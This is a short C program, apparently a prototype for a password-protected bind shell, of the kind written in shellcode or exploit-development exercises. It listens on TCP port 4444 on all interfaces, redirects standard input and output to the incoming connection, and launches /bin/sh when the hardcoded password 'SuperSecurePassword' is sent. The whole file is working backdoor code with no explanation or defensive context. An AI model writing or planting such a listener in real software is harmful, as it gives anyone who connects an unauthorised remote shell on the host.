#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>

int main(int argc, char **argv)
{

	char *p = "SuperSecurePassword";
	int length = strlen(p);

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in address = {
		.sin_family = AF_INET,
		.sin_port = htons(4444),
		.sin_addr = INADDR_ANY
	};

	bind(sockfd, (struct sockaddr*) &address, sizeof(address));

	listen(sockfd, 0);

	int acceptfd = accept(sockfd, NULL, NULL);
	
	dup2(acceptfd, 0);
        dup2(acceptfd, 1);
        dup2(acceptfd, 2);

	char pass[64];
	read(acceptfd, pass, 64);
	
	if (strncmp(pass, p, length) == 0)
	{
		execve("/bin/sh", NULL, NULL);
	}
	else
	{
		exit(-1);
	}
	
	return 0;
}
